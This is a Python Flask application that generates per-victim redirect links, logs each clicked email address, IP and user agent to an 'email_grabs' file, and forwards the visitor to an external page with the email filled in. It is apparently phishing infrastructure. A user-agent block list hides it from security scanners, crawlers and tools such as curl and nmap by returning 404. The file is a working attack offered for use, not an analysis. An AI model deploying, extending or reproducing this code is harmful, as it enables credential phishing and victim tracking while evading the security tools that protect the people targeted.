from flask import Flask, redirect, request, render_template_string
import uuid
import datetime
import random
import os

app = Flask(__name__)

TARGET_URL = "https://candid-lebkuchen-7ff898.netlify.app/?email="

LOG_FILE = "email_grabs.log"

BLOCKED_UA_KEYWORDS = [
    "bot", "crawler", "spider", "curl", "wget", "python", "requests", "scrapy",
    "selenium", "phantomjs", "headless", "zgrab", "nmap", "nuclei", "httpx",
    "go-http", "facebookexternalhit", "twitterbot", "googlebot", "bingbot",
    "slurp", "duckduckbot", "baiduspider", "yandex", "semrush", "ahrefs",
    "mj12bot", "virus", "scanner", "security", "malware"
]

def is_bot(user_agent):
    if not user_agent:
        return True
    ua = user_agent.lower()
    return any(keyword in ua for keyword in BLOCKED_UA_KEYWORDS)

# Simple in-memory storage for generated links (works on Render free tier)
generated_links = {}

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head><title>Link Generator</title></head>
<body style="font-family:Arial; text-align:center; margin-top:50px;">
    <h2>Your Unique Redirect Link</h2>
    <p><strong>{{ generated_url }}</strong></p>
    <p>Share this link. It will grab the email, generate a new click ID every time it's used, and redirect.</p>
    <a href="/generate">Generate Another Link</a>
</body>
</html>
"""

@app.route('/generate')
def generate_link():
    user_agent = request.headers.get('User-Agent', '')
    if is_bot(user_agent):
        return "Not found", 404

    email = request.args.get('email', '').strip()
    unique_id = uuid.uuid4().hex[:12]   # Short clean ID

    generated_url = f"{request.host_url}r/{unique_id}"
    
    if email:
        generated_links[unique_id] = email
        generated_url += f"?email={email}"

    return render_template_string(HTML_TEMPLATE, generated_url=generated_url)

@app.route('/r/<unique_id>')
def redirect_link(unique_id):
    user_agent = request.headers.get('User-Agent', '')
    if is_bot(user_agent):
        return "Not found", 404

    email = generated_links.get(unique_id, request.args.get('email', 'none'))
    click_id = str(uuid.uuid4())
    ip = request.remote_addr
    ref = request.headers.get('Referer', 'Direct')
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if email and email != 'none':
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] ClickID:{click_id} | UniqueID:{unique_id} | IP:{ip} | Email:{email} | UA:{user_agent}\n")
        print(f"[GRABBED] {email} | ClickID: {click_id}")

    separator = "&" if "?" in TARGET_URL else "?"
    final_link = TARGET_URL + email + f"{separator}click={click_id}&uid={unique_id}"

    return redirect(final_link, code=301)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
